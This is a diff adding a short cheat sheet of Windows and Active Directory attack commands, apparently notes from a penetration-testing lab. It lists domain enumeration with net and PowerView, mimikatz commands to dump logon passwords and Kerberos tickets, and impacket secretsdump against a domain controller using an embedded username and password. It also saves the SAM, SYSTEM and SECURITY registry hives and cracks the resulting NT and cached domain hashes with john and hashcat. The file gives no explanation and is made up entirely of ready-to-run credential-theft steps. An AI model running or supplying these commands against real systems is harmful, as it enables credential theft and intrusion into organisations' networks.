@@ -1,0 +1,27 @@
+net user /domain
+net user adam /domain
+net group /domain
+powershell -c [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+powershell -noexit "& ""C:\ldap.ps1"""
+
+powershell -noexit "& ""C:\PowerView.ps1"""
+
+.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::tickets
+
+impacket-secretsdump -just-dc-ntlm xor.com/david:dsfdf34534tdfGDFG5rdgr@10.11.1.120 * dump dc hashes *
+
+reg save hklm\sam .\sam
+reg save hklm\system .\system
+reg save hklm\security .\security
+/usr/local/bin/secretsdump.py -system system -security security -sam sam LOCAL
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT passwords.txt
+hashcat -m 1000 -a 0 passwords.txt /usr/share/wordlists/rockyou.txt
+PwDump.exe localhost > password.txt
+
+Local domain creds:
+remove <domain>/<username>: from hash
+hashcat -m 2100 -a 0 domain.hash /usr/share/wordlists/rockyou.txt
